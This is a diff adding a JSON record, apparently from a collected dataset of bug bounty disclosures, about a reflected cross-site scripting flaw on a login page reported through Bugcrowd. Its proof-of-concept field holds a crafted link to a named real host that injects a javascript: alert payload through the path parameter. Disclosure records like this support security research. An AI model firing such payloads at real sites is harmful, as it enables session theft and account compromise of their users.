@@ -1,0 +1,17 @@
+{
+  "platform": "bugcrowd",
+  "vuln": "xss",
+  "url": "https://bugcrowd.com/disclosures/63a1d77c-df3b-4a1a-95fe-d5aa474fb9b7/reflected-cross-site-scripting-in-login-page",
+  "title": "Reflected cross site scripting in login page - CrowdStream - Bugcrowd",
+  "discovered_at": "2026-04-24T13:35:06.989987+00:00",
+  "how_to_find": [
+    "Reflected cross site scripting in login page - CrowdStream - Bugcrowd"
+  ],
+  "payloads_or_poc": [
+    "1) Send this link to any user https://accountsstage.yoyogames.com/login?path=javascript:alert(%27KD%27)"
+  ],
+  "source": {
+    "fetched_at": "2026-04-24T13:35:06.990000+00:00",
+    "http_status": 200
+  }
+}
